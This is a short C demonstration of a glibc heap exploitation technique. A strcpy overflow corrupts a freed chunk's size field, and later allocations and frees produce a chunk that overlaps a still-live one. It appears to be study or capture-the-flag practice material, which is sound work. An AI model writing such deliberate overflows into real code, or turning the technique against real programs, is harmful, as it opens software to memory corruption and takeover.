#include <stdio.h>
#include <malloc.h>
#include <unistd.h>
#include <string.h>
int main(){
    char *p = malloc(0x18);
    char *q = malloc(0x110-8);
    char *r = malloc(0x110-8);
    printf("p = %p\n",p);
    printf("q = %p\n",q);
    printf("r = %p\n",r);
    sleep(0);
    *(long*) (r-0x20) =  0x100; //fake->prev_size   fake_chunk
    *(long*) (r-0x18) =  0x101; //fake->size
    sleep(0);
    free(q);                    //into unsorted bin   
    sleep(0);
    strcpy(p,"aaaaaaaajunkjunkbbbbbbbb"); //q size->inuse=0 size=0x100
    sleep(0);
    char *q1 = malloc(0x80);    //B1 q
    char *q2 = malloc(0x60);    //B2 q+0x90
    printf("q1 = %p\n",q1); 
    printf("q2 = %p\n",q2);
    sleep(0);
    free(q1);
    free(r);                    //overlapping q1, q2
    sleep(0);
    char *q12 = malloc(0x100 + 0x100 + 0x10); //start at q
    printf("q2 = %p\n",q2);
    printf("q12 = %p\n",q12);
    sleep(0);
    return 0;
}